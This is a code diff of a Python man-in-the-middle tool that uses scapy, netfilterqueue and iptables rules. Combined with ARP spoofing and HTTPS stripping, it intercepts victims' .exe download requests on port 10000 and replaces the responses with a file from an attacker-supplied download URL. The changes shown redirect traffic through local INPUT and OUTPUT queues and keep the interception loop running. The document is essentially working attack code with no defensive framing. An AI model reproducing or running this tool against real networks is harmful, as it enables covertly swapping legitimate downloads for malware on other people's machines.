@@ -24,7 +24,8 @@ import subprocess
 # HTTPSstrip (in arp-spoofer), combine with dns-spoofer, display originally intended download URL
 
 def config_iptables():
-    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
 
 
 def flush_iptables():
@@ -47,13 +48,13 @@ def analyze_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         # HTTP Requests
-        if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+        if scapy_packet[scapy.TCP].dport == 10000:
+            if ".exe" in scapy_packet[scapy.Raw].load and options.download_url not in scapy_packet[scapy.Raw].load:
                 print("[+] .exe Request Detected")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
 
         # HTTP Responses
-        elif scapy_packet[scapy.TCP].sport == 80:
+        elif scapy_packet[scapy.TCP].sport == 10000:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file...")
@@ -81,7 +82,9 @@ queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, analyze_packet)
 
 try:
-    queue.run()
+    while True:
+        queue.run()
+        print("Error Encountered")
 except KeyboardInterrupt:
     print("\n[-] Flushing/Restoring IP tables...")
     flush_iptables()
